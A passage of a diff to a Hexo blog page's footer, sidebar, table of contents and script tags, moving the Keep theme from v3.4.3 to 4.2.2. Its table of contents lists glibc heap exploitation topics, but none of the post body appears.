             
-            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
         </div>
-        
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="website-count info-item">
-                
-                    <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">335.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
         </div>
-        
-    </div>
+    
+
+    
 </footer>
 
         </div>
     </div>
 
+    <!-- post tools -->
     
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="tools-list">
-        <!-- TOC aside toggle -->
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
-        <!-- go comment -->
+        <!-- PC go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
         </div>
     
 
-    <div class="right-bottom-side-tools">
-        <div class="side-tools-container">
-    <ul class="side-tools-list">
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
         <li class="tools-item tool-font-adjust-plus flex-center">
             <i class="fas fa-search-plus"></i>
         </li>
@@ -493,13 +663,12 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
@@ -513,42 +682,45 @@
             </li>
         
 
-        
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
-
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
     </ul>
 
-    <ul class="exposed-tools-list">
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
         <li class="tools-item tool-toggle-show flex-center">
             <i class="fas fa-cog fa-spin"></i>
         </li>
-        
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
     </ul>
 </div>
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-force"><span class="nav-text">house of force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-lora"><span class="nav-text">house of lora</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Glibc2-23"><span class="nav-text">Glibc2.23</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Glibc-2-27%E5%90%8E"><span class="nav-text">Glibc 2.27后</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-botcake"><span class="nav-text">house of botcake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-orange"><span class="nav-text">house of orange</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
+    <!-- local search -->
     
         <div class="search-pop-overlay">
     <div class="popup search-popup">
@@ -566,7 +738,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -580,29 +752,76 @@
 
     
 
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-force"><span class="nav-text">house of force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-lora"><span class="nav-text">house of lora</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Glibc2-23"><span class="nav-text">Glibc2.23</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Glibc-2-27%E5%90%8E"><span class="nav-text">Glibc 2.27后</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-botcake"><span class="nav-text">house of botcake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-orange"><span class="nav-text">house of orange</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
 </main>
 
 
 
-<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
 
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>
 
 
+<!-- lazyload -->
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
-
-
-
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>
 
 
-<div class="post-scripts">
+<div class="">
+    <!-- home page -->
     
-        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
 
 
 
